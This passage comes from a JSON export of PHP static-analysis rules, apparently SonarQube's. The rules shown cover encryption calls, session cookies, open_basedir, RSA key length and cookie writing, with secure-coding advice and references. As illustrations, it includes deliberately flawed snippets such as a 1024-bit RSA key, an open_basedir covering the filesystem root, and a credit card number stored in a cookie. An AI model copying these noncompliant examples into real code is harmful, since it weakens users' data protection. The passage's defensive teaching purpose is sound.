TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS\nversions, and improves performance.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S4787": {
        "name": "Encrypting data is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=php%3AS4426'>S4426</a>, <a href='/coding_rules#rule_key=php%3AS5542'>S5542</a>, <a href='/coding_rules#rule_key=php%3AS5547'>S5547</a> instead.</p>\n<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902\">CVE-2017-7902</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378\">CVE-2006-1378</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376\">CVE-2003-1376</a> </li>\n</ul>\n<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed\nregularly. However these are not the only means to defeat or weaken an encryption.</p>\n<p>This rule flags function calls that initiate encryption/decryption.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>\n  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>\n  <li> the key exchange is made without properly authenticating the receiver. </li>\n  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time\n  passes. </li>\n  <li> the chosen encryption library is deemed unsafe. </li>\n  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>\n  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.\n  </li>\n  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it’s IV (Initialization Vector) is not generated using a secure random\n  algorithm, or it is reused. </li>\n  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.\n  </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Generate encryption keys using secure random algorithms. </li>\n  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force\n  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.\n  </li>\n  <li> Regenerate the keys regularly. </li>\n  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>\n  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>\n  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are\n  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most\n  probably have flaws. </li>\n  <li> When a nonce is used, generate it randomly every time. </li>\n  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>\n  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks\n  like \"Chosen-Plaintext Attacks\". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption\n  cycle, because the IV’s purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>\n  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be\n  preferred to the following combinations which are not secured:\n    <ul>\n      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it\n      does not hide data patterns well. In some senses, it doesn’t provide serious message confidentiality, and it is not recommended for use in\n      cryptographic protocols at all. </li>\n      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>Builtin functions</p>\n<pre>\nfunction myEncrypt($cipher, $key, $data, $mode, $iv, $options, $padding, $infile, $outfile, $recipcerts, $headers, $nonce, $ad, $pub_key_ids, $env_keys)\n{\n    mcrypt_ecb ($cipher, $key, $data, $mode); // Sensitive\n    mcrypt_cfb($cipher, $key, $data, $mode, $iv); // Sensitive\n    mcrypt_cbc($cipher, $key, $data, $mode, $iv); // Sensitive\n    mcrypt_encrypt($cipher, $key, $data, $mode); // Sensitive\n\n    openssl_encrypt($data, $cipher, $key, $options, $iv); // Sensitive\n    openssl_public_encrypt($data, $crypted, $key, $padding); // Sensitive\n    openssl_pkcs7_encrypt($infile, $outfile, $recipcerts, $headers); // Sensitive\n    openssl_seal($data, $sealed_data, $env_keys, $pub_key_ids); // Sensitive\n\n    sodium_crypto_aead_aes256gcm_encrypt ($data, $ad, $nonce, $key); // Sensitive\n    sodium_crypto_aead_chacha20poly1305_encrypt ($data, $ad, $nonce, $key); // Sensitive\n    sodium_crypto_aead_chacha20poly1305_ietf_encrypt ($data, $ad, $nonce, $key); // Sensitive\n    sodium_crypto_aead_xchacha20poly1305_ietf_encrypt ($data, $ad, $nonce, $key); // Sensitive\n    sodium_crypto_box_seal ($data, $key); // Sensitive\n    sodium_crypto_box ($data, $nonce, $key); // Sensitive\n    sodium_crypto_secretbox ($data, $nonce, $key); // Sensitive\n    sodium_crypto_stream_xor ($data, $nonce, $key); // Sensitive\n}\n</pre>\n<p>CakePHP</p>\n<pre>\nuse Cake\\Utility\\Security;\n\nfunction myCakeEncrypt($key, $data, $engine)\n{\n    Security::encrypt($data, $key); // Sensitive\n\n    // Do not use custom made engines and remember that Mcrypt is deprecated.\n    Security::engine($engine); // Sensitive. Setting the encryption engine.\n}\n</pre>\n<p>CodeIgniter</p>\n<pre>\nclass EncryptionController extends CI_Controller\n{\n    public function __construct()\n    {\n        parent::__construct();\n        $this-&gt;load-&gt;library('encryption');\n    }\n\n    public function index()\n    {\n        $this-&gt;encryption-&gt;create_key(16); // Sensitive. Review the key length.\n        $this-&gt;encryption-&gt;initialize( // Sensitive.\n            array(\n                'cipher' =&gt; 'aes-256',\n                'mode' =&gt; 'ctr',\n                'key' =&gt; 'the key',\n            )\n        );\n        $this-&gt;encryption-&gt;encrypt(\"mysecretdata\"); // Sensitive.\n    }\n}\n</pre>\n<p>CraftCMS version 3</p>\n<pre>\nuse Craft;\n\n// This is similar to Yii as it used by CraftCMS\nfunction craftEncrypt($data, $key, $password) {\n    Craft::$app-&gt;security-&gt;encryptByKey($data, $key); // Sensitive\n    Craft::$app-&gt;getSecurity()-&gt;encryptByKey($data, $key); // Sensitive\n    Craft::$app-&gt;security-&gt;encryptByPassword($data, $password); // Sensitive\n    Craft::$app-&gt;getSecurity()-&gt;encryptByPassword($data, $password); // Sensitive\n}\n</pre>\n<p>Drupal 7 - Encrypt module</p>\n<pre>\nfunction drupalEncrypt() {\n    $encrypted_text = encrypt('some string to encrypt'); // Sensitive\n}\n</pre>\n<p>Joomla</p>\n<pre>\nuse Joomla\\Crypt\\CipherInterface;\n\nabstract class MyCipher implements CipherInterface // Sensitive. Implementing custom cipher class\n{}\n\nfunction joomlaEncrypt() {\n    new Joomla\\Crypt\\Cipher_Sodium(); // Sensitive\n    new Joomla\\Crypt\\Cipher_Simple(); // Sensitive\n    new Joomla\\Crypt\\Cipher_Rijndael256(); // Sensitive\n    new Joomla\\Crypt\\Cipher_Crypto(); // Sensitive\n    new Joomla\\Crypt\\Cipher_Blowfish(); // Sensitive\n    new Joomla\\Crypt\\Cipher_3DES(); // Sensitive\n}\n}\n</pre>\n<p>Laravel</p>\n<pre>\nuse Illuminate\\Support\\Facades\\Crypt;\n\nfunction myLaravelEncrypt($data)\n{\n    Crypt::encryptString($data); // Sensitive\n    Crypt::encrypt($data); // Sensitive\n    // encrypt using the Laravel \"encrypt\" helper\n    encrypt($data); // Sensitive\n}\n</pre>\n<p>PHP-Encryption library</p>\n<pre>\nuse Defuse\\Crypto\\Crypto;\nuse Defuse\\Crypto\\File;\n\nfunction mypPhpEncryption($data, $key, $password, $inputFilename, $outputFilename, $inputHandle, $outputHandle) {\n    Crypto::encrypt($data, $key); // Sensitive\n    Crypto::encryptWithPassword($data, $password); // Sensitive\n    File::encryptFile($inputFilename, $outputFilename, $key); // Sensitive\n    File::encryptFileWithPassword($inputFilename, $outputFilename, $password); // Sensitive\n    File::encryptResource($inputHandle, $outputHandle, $key); // Sensitive\n    File::encryptResourceWithPassword($inputHandle, $outputHandle, $password); // Sensitive\n}\n</pre>\n<p>PhpSecLib</p>\n<pre>\nfunction myphpseclib($mode) {\n    new phpseclib\\Crypt\\RSA(); // Sensitive. Note: RSA can also be used for signing data.\n    new phpseclib\\Crypt\\AES(); // Sensitive\n    new phpseclib\\Crypt\\Rijndael(); // Sensitive\n    new phpseclib\\Crypt\\Twofish(); // Sensitive\n    new phpseclib\\Crypt\\Blowfish(); // Sensitive\n    new phpseclib\\Crypt\\RC4(); // Sensitive\n    new phpseclib\\Crypt\\RC2(); // Sensitive\n    new phpseclib\\Crypt\\TripleDES(); // Sensitive\n    new phpseclib\\Crypt\\DES(); // Sensitive\n\n    new phpseclib\\Crypt\\AES($mode); // Sensitive\n    new phpseclib\\Crypt\\Rijndael($mode); // Sensitive\n    new phpseclib\\Crypt\\TripleDES($mode); // Sensitive\n    new phpseclib\\Crypt\\DES($mode); // Sensitive\n}\n</pre>\n<p>Sodium Compat library</p>\n<pre>\nfunction mySodiumCompatEncrypt($data, $ad, $nonce, $key) {\n    ParagonIE_Sodium_Compat::crypto_aead_chacha20poly1305_ietf_encrypt($data, $ad, $nonce, $key); // Sensitive\n    ParagonIE_Sodium_Compat::crypto_aead_xchacha20poly1305_ietf_encrypt($data, $ad, $nonce, $key); // Sensitive\n    ParagonIE_Sodium_Compat::crypto_aead_chacha20poly1305_encrypt($data, $ad, $nonce, $key); // Sensitive\n\n    ParagonIE_Sodium_Compat::crypto_aead_aes256gcm_encrypt($data, $ad, $nonce, $key); // Sensitive\n\n    ParagonIE_Sodium_Compat::crypto_box($data, $nonce, $key); // Sensitive\n    ParagonIE_Sodium_Compat::crypto_secretbox($data, $nonce, $key); // Sensitive\n    ParagonIE_Sodium_Compat::crypto_box_seal($data, $key); // Sensitive\n    ParagonIE_Sodium_Compat::crypto_secretbox_xchacha20poly1305($data, $nonce, $key); // Sensitive\n}\n</pre>\n<p>Yii version 2</p>\n<pre>\nuse Yii;\n\n// Similar to CraftCMS as it uses Yii\nfunction YiiEncrypt($data, $key, $password) {\n    Yii::$app-&gt;security-&gt;encryptByKey($data, $key); // Sensitive\n    Yii::$app-&gt;getSecurity()-&gt;encryptByKey($data, $key); // Sensitive\n    Yii::$app-&gt;security-&gt;encryptByPassword($data, $password); // Sensitive\n    Yii::$app-&gt;getSecurity()-&gt;encryptByPassword($data, $password); // Sensitive\n}\n</pre>\n<p>Zend</p>\n<pre>\nuse Zend\\Crypt\\FileCipher;\nuse Zend\\Crypt\\PublicKey\\DiffieHellman;\nuse Zend\\Crypt\\PublicKey\\Rsa;\nuse Zend\\Crypt\\Hybrid;\nuse Zend\\Crypt\\BlockCipher;\n\nfunction myZendEncrypt($key, $data, $prime, $options, $generator, $lib)\n{\n    new FileCipher; // Sensitive. This is used to encrypt files\n\n    new DiffieHellman($prime, $generator, $key); // Sensitive\n\n    $rsa = Rsa::factory([ // Sensitive\n        'public_key'    =&gt; 'public_key.pub',\n        'private_key'   =&gt; 'private_key.pem',\n        'pass_phrase'   =&gt; 'mypassphrase',\n        'binary_output' =&gt; false,\n    ]);\n    $rsa-&gt;encrypt($data); // No issue raised here. The configuration of the Rsa object is the line to review.\n\n    $hybrid = new Hybrid(); // Sensitive\n\n    BlockCipher::factory($lib, $options); // Sensitive\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/321\">CWE-321 - Use of Hard-coded Cryptographic Key</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/322\">CWE-322 - Key Exchange without Entity Authentication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/323\">CWE-323 - Reusing a Nonce, Key Pair in Encryption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/324\">CWE-324 - Use of a Key Past its Expiration Date</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/325\">CWE-325 - Missing Required Cryptographic Step</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S3332": {
        "name": "Session-management cookies should not be persistent",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<h2>Why is this an issue?</h2>\n<p>Cookies without fixed lifetimes or expiration dates are known as non-persistent, or \"session\" cookies, meaning they last only as long as the\nbrowser session, and poof away when the browser closes. Cookies with expiration dates, \"persistent\" cookies, are stored/persisted until those\ndates.</p>\n<p>Non-persistent cookies should be used for the management of logged-in sessions on web sites. To make a cookie non-persistent, simply omit the\n<code>expires</code> attribute.</p>\n<p>This rule raises an issue when <code>expires</code> is set for a session cookie, either programmatically or via configuration, such as\n<code>session.cookie_lifetime</code>.</p>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#expire-and-max-age-attributes\">OWASP, Session\n  Management Cheat Sheet</a> - Expire and Max-Age Attributes </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#COOKIE_PERSISTENT\">COOKIE_PERSISTENT</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S3333": {
        "name": "\"open_basedir\" should limit file access",
        "htmlDesc": "<p>When accessing files on the local filesystem, PHP can enforce security checks to defend against some attacks. The <code>open_basedir</code> setting\nin the main PHP configuration defines a set of directories that the application is allowed to access. Access to locations outside of these directories\nwill be blocked.</p>\n<h2>Why is this an issue?</h2>\n<p>The PHP runtime will allow the application to access all files underneath the configured set of directories. If no value is set, the application\nmay access any file on the filesystem.</p>\n<h3>What is the potential impact?</h3>\n<p><code>open_basedir</code> is commonly used to ensure that a PHP application can only access files needed for the application function. While\ndeactivating this setting does not pose a direct threat to the application’s security, it can make exploitation of other vulnerabilities easier and\nmore severe.</p>\n<p>If an attacker can exploit a path traversal vulnerability, they will be able to access any file made available to the application’s user account.\nThis may include system-critical or otherwise sensitive files.</p>\n<p>In shared hosting environments, a vulnerability can affect all co-hosted applications and not only the vulnerable one. <code>open_basedir</code>\ncan help limit the scope of the compromise in that case.</p>\n<h2>How to fix it</h2>\n<p>The main PHP configuration should define the <code>open_basedir</code> setting. This setting should not include overly large directories, such as\nthe root directory of the filesystem.</p>\n<p>Adding the current directory, denoted by “.”, to the <code>open_basedir</code> configuration is also dangerous. It is possible to change the\ncurrent directory within PHP scripts by calling <code>chdir()</code>, effectively removing any protection.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n; php.ini\nopen_basedir=\"/:${USER}/scripts/data\"  ; Noncompliant; root directory in the list\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n; php.ini\n; open_basedir= ; Noncompliant; setting commented out\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n; php.ini\nopen_basedir=\"${USER}/scripts/data\"\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n; php.ini try 1\nopen_basedir=\"/var/www/myapp/data\"\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/23\">CWE-23 - Relative Path Traversal</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/36\">CWE-36 - Absolute Path Traversal</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "php:S4426": {
        "name": "Cryptographic keys should be robust",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>\n<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>\n<ul>\n  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>\n  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.\n    <ul>\n      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key\n      Derivation Function 2) </li>\n    </ul>  </li>\n</ul>\n<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at\nthe plaintext.</p>\n<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this\ndata after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Here is an example of a private key generation with RSA:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n$config = [\n    \"digest_alg\"       =&gt; \"sha512\",\n    \"private_key_bits\" =&gt; 1024,                 // Noncompliant\n    \"private_key_type\" =&gt; OPENSSL_KEYTYPE_RSA,\n];\n\n$res = openssl_pkey_new($config);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$config = [\n    \"digest_alg\"       =&gt; \"sha512\",\n    \"private_key_bits\" =&gt; 2048,\n    \"private_key_type\" =&gt; OPENSSL_KEYTYPE_RSA,\n];\n\n$res = openssl_pkey_new($config);\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>\n<p>The appropriate choices are the following.</p>\n<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>\n<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>\n<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of\n<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>\n<h4>AES (Advanced Encryption Standard)</h4>\n<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying\nall possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.\nTherefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>\n<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>\n<h4>Elliptic Curve Cryptography (ECC)</h4>\n<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve\nalgorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>\n<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>\n<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve\nparameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves\ncurrently include:</p>\n<ul>\n  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>\n  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>\n  <li> Curve448. </li>\n  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>\n</ul>\n<h3>Going the extra mile</h3>\n<h4>Pre-Quantum Cryptography</h4>\n<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep\nin mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or\n\"post-quantum\") counterpart.</p>\n<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>\n<p><a href=\"https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation\">Learn more here</a>.</p>\n<h2>Resources</h2>\n<ul>\n  <li> Documentation\n    <ul>\n      <li> NIST Documentation - <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf\">NIST SP 800-186: Recommendations\n      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>\n      <li> IETF - <a href=\"https://datatracker.ietf.org/doc/html/rfc5639\">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and\n      Curve Generation</a> </li>\n    </ul>  </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf\">NIST 800-131A</a> - Recommendation for Transitioning the\n  Use of Cryptographic Algorithms and Key Lengths </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S2255": {
        "name": "Writing cookies is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11639\">CVE-2018-11639</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537\">CVE-2016-6537</a> </li>\n</ul>\n<p>Attackers can use widely-available tools to read cookies. Any sensitive information they may contain will be exposed.</p>\n<p>This rule flags code that writes cookies.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> sensitive information is stored inside the cookie. </li>\n</ul>\n<p>You are at risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the\nuser session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer\nthan the user session.</p>\n<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the\noriginal information will be exposed.</p>\n<p>Using cookies only for session IDs doesn’t make them secure. Follow <a\nhref=\"https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies\">OWASP best practices</a> when you configure your\ncookies.</p>\n<p>As a side note, every information read from a cookie should be <a\nhref=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitized</a>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n$value = \"1234 1234 1234 1234\";\n\n// Review this cookie as it seems to send sensitive information (credit card number).\nsetcookie(\"CreditCardNumber\", $value, $expire, $path, $domain, true, true); // Sensitive\nsetrawcookie(\"CreditCardNumber\", $value, $expire, $path, $domain, true, true); // Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> 